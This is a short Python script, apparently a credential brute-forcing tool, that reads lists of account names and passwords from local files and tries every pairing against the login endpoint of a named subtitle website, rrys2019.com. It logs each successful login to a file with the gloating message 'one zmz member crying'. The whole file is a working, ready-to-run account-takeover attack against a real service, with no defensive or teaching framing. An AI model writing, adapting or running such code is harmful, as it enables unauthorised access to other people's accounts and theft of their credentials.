#!/usr/bin/python3
# coding:utf-8


import sys
import requests
import json
import time


class OpenZmz:
  def __init__(self):
    self.post_url = "http://www.rrys2019.com/User/Login/ajaxLogin"
    self.post_headers = {
      "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 OPR/55.0.2994.61",
      "Accept":"application/json, text/javascript, */*; q=0.01"
    }
    self.targetList = []
    self.ammoList = []

  def findTarget(self):
    print("**start program**")
    time.sleep(2)
    print("read nameormail.txt...")
    try:
      with open("nameormail.txt","r",encoding="utf-8") as f:
        l = 1
        while l:
          l = f.readline()
          nameormail = l.split("\n")[0]
          if nameormail != "":
            self.targetList.append(nameormail)
      if len(self.targetList) == 0:
        time.sleep(2)
        print("no target available, should add name or mail to nameormail.txt first...")
        sys.exit()
    except Exception as e:
      time.sleep(2)
      print("no target available, should add name or mail to nameormail.txt first...")
      sys.exit()
    print("find {} targets...".format(len(self.targetList)))

  def aimTarget(self):
    time.sleep(2)
    print("read ammos.txt...")
    with open("ammos.txt","r",encoding="utf-8") as f:
      l = 1
      while l:
        l = f.readline()
        ammo = l.split("\n")[0]
        if ammo != "":
          self.ammoList.append(ammo)
    if len(self.ammoList) == 0:
      time.sleep(2)
      print("no ammo, should add password to ammos.txt first...")
      sys.exit()
    print("add {} ammos...".format(len(self.ammoList)))

  def digTarget(self):
    time.sleep(2)
    for target in self.targetList:
      print("try next target...")
      for ammo in self.ammoList:
        post_data = {"account":target,"password":ammo,"remember":"0","url_back":"http://www.rrys2019.com"}
        while True:
          try:
            response = requests.post(self.post_url,headers=self.post_headers,data=post_data)
          except Exception as e:
            print("post request err, try again...")
            time.sleep(2)
            continue
          if response.status_code == 200:
            break
          else:
            print("502...")
            time.sleep(2)
            continue
        html = response.content.decode()
        html = json.loads(html)
        info = html["info"]
        if info == "登录成功！":
          with open("zmzcry.txt","a",encoding="utf-8") as f:
            f.write(target + "  :  " + ammo + "\n")
          print("one zmz member crying...")
          break
        elif info == "账号不存在,请先注册账号":
          print("target wrong, skip and continue...")
          break
    print("**end program**")

  def run(self):
    self.findTarget()
    self.aimTarget()
    self.digTarget()


if __name__ == "__main__":
  zmz = OpenZmz()
  zmz.run()
  
